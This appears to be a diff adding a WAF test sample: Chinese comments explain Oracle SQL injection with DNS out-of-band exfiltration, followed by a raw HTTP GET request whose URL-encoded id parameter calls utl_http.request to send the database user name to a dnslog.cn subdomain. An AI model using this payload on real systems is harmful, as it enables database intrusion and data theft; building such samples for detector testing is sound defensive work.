@@ -1,0 +1,10 @@
+# SQL注入_GET_oracle_普通注入(DNS注入)
+# 在无法直接利用漏洞获得回显，或sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被安全设备拦截的情况下，如果目标可以发起DNS请求，此时可通过DNSlog把想获得的数据外带出来，在DNSlog日志中查看。
+# 该sql语句的目的是从虚拟表dual中获取所有用户的用户信息，并通过dns查询将信息外带出内网。通过获取的信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%27%20and%20utl_http.request%28%28select%20user%20from%20dual%29%7C%7C%27.o69syg.dnslog.cn%27%29%2C%274%27%2C%275%27%20from%20dual%20--&bid=hd_tag_m8mv256d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv256d
+RM-PRO-Token: 2f9be9f8b16d3076cc25befdc9a7c8bb
+RM-PRO-Time: 1742808444919
+User-Agent: curl/7.83.1
+
